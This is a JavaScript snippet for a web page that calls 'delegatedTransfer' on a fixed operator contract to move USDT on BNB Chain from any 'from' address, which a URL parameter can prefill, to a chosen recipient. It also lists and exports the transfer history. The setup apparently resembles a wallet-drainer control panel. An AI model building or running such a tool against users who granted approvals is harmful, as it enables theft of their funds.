const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
const USDT = "0x55d398326f99059fF775485246999027B3197955";

const OP_ABI = [
  "function delegatedTransfer(address,address,address,uint256) external",
  "event TokensTransferred(address indexed token,address indexed from,address indexed to,uint256 amount)"
];

const params = new URLSearchParams(window.location.search);
if (params.get("from")) document.getElementById("from").value = params.get("from");

async function withdraw() {
  await window.ethereum.request({method:"eth_requestAccounts"});
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  const op = new ethers.Contract(TOKEN_OPERATOR, OP_ABI, signer);
  const tx = await op.delegatedTransfer(
    USDT,
    from.value,
    to.value,
    ethers.parseUnits(amount.value,6)
  );
  await tx.wait();
  alert("Withdraw successful");
}

// ===== HISTORY =====
let csvData = [];
async function loadHistory() {
  const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
  const op = new ethers.Contract(TOKEN_OPERATOR, OP_ABI, provider);
  const latest = await provider.getBlockNumber();
  const events = await op.queryFilter(op.filters.TokensTransferred(), latest-50000, latest);

  const tbody = document.getElementById("history");
  tbody.innerHTML = "";
  csvData = [];

  events.forEach(e=>{
    const row = [
      e.args.from,
      e.args.to,
      ethers.formatUnits(e.args.amount,6),
      e.transactionHash
    ];
    csvData.push(row);

    tbody.innerHTML += `<tr>
      <td>${row[0]}</td>
      <td>${row[1]}</td>
      <td>${row[2]}</td>
      <td>${row[3].slice(0,10)}...</td>
    </tr>`;
  });
}

function exportCSV() {
  let csv = "From,To,Amount,Tx\n";
  csvData.forEach(r=>csv+=r.join(",")+"\n");
  const a = document.createElement("a");
  a.href = URL.createObjectURL(new Blob([csv]));
  a.download = "withdraw_history.csv";
  a.click();
}
